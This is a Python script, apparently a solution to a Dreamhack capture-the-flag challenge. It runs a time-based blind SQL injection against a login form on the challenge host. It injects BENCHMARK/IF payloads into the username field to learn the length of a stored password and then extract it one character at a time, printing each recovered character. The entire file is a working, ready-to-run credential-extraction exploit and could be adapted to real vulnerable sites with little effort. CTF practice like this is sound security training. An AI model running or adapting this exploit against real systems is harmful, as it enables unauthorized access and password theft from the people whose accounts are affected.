import requests
import string
import time

URL = "http://host1.dreamhack.games:23747"
CHARS = string.ascii_letters + string.digits + "!@#$%^&*()_+-={}[]|:;<>,.?"

def make_session():
    session = requests.Session()
    try:
        # 타임아웃을 10초로 설정
        response = session.post(URL, timeout=10)
        session_cookie = session.cookies.get_dict()
        return session_cookie
    except requests.exceptions.ConnectTimeout:
        return None

def test_condition(query):
    data = {
        "username": query,
        "password": "irrelevant"
    }
    session = make_session()
    start_time = time.time()
    response = requests.post(f"{URL}/login", data=data, cookies=session)
    elapsed_time = time.time() - start_time
    print(elapsed_time)
    return elapsed_time > 2  # BENCHMARK가 실행되어 응답 시간이 늘어났다면 조건이 참

def find_password_length():
    for length in range(1, 33):  # 최대 길이 32로 가정
        query = f"' OR IF(LENGTH(password)={length}, BENCHMARK(10000000, MD5(1)),0) -- "
        if test_condition(query):
            print(f"[+] Password length: {length}")
            return length
    return 0

def extract_password(length):
    password = ""
    for pos in range(1, length + 1):
        for char in CHARS:
            query = f"' OR IF(ascii(substr(password,{pos},1))={ord(char)}, BENCHMARK(10000000, MD5(1)), 0) -- "
            if test_condition(query):
                password += char
                print(f"[+] Found character at position {pos}: {char}")
                break
    return password

if __name__ == "__main__":
    print("[*] Starting SQL Injection exploit...")
    password_length = find_password_length()
    if password_length:
        print("[*] Extracting password...")
        password = extract_password(password_length)
        print(f"[+] Extracted password: {password}")
    else:
        print("[-] Failed to determine password length.")
